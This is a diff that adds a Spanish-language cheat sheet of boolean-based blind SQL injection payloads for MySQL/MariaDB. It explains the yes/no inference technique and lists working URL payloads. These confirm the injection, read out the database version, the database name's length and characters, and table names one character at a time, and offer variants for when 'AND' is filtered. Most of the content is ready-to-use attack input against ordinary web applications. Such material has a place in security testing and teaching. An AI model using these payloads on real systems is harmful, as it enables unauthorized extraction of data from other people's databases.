@@ -1,0 +1,49 @@
+# =========================================================
+# PAYLOADS SQLI CIEGOS BOOLEANOS (Boolean-Based Blind SQLi)
+# =========================================================
+# Este ataque infiere la información preguntando a la base de datos preguntas de sí/no 
+# (booleanas) y observando la diferencia en la respuesta HTTP de la aplicación.
+# Se requiere una herramienta automatizada para probar letra por letra y determinar si la respuesta es TRUE o FALSE.
+
+# 1. TESTEO BÁSICO (MySQL/MariaDB)
+# -----------------------------------
+# Se usa una condición simple que no afecta el comportamiento de la página para la consulta normal (ej. AND 1=1).
+
+# 1.1 Condición Verdadera (La página DEBE cargar normalmente)
+# URL: ?id=1 AND 1=1 -- 
+# Resultado: La página carga sin cambios. (Condición TRUE)
+
+# 1.2 Condición Falsa (La página DEBE cambiar/fallar/no devolver resultados)
+# URL: ?id=1 AND 1=2 -- 
+# Resultado: La página muestra un error o queda vacía. (Condición FALSE)
+# Nota: Si ambos tests funcionan, se confirma que la inyección booleana es posible.
+
+# 2. EXTRACCIÓN DE INFORMACIÓN (MySQL/MariaDB)
+# ---------------------------------------------
+# Se usa la misma lógica de SUBSTRING y ASCII que en Time-Based, pero con la condición booleana.
+
+# 2.1 Obtener la Versión (Ejemplo: ¿La 1era letra es '5' (ASCII 53)?)
+# Si la versión comienza con 5, la condición es TRUE y la página carga normalmente.
+# URL: ?id=1 AND (SELECT ASCII(SUBSTRING(@@version,1,1)))=53 -- 
+
+# 2.2 Encontrar el Largo de la Base de Datos
+# ¿El largo del nombre de la base de datos es 8?
+# URL: ?id=1 AND (SELECT LENGTH(database()))=8 -- 
+
+# 2.3 Extraer un Carácter de la Base de Datos Actual
+# ¿La 1era letra (posición 1) del nombre de la DB es 's' (ASCII 115)?
+# URL: ?id=1 AND (SELECT ASCII(SUBSTRING(database(),1,1)))=115 -- 
+# Si la página carga normal, la respuesta es 's'. Si cambia, es otro carácter.
+
+# 2.4 Extraer Nombres de Tablas (Por Carácter)
+# ¿El 1er carácter (posición 1) del nombre de la 1ra tabla (LIMIT 0,1) es 'u' (ASCII 117)?
+# URL: ?id=1 AND (SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)))=117 -- 
+# Se ajusta la posición del carácter y el valor ASCII hasta encontrarlo.
+
+# 3. PAYLOADS AVANZADOS (Si 'AND' está bloqueado)
+# -----------------------------------------------
+# Se pueden usar operadores lógicos alternativos o sintaxis de caso.
+
+# 3.1 Usando el operador de negación ('NOT' o '!')
+# URL: ?id=1' or not(1=1) -- 
+# URL: ?id=1' and !(1=1) --
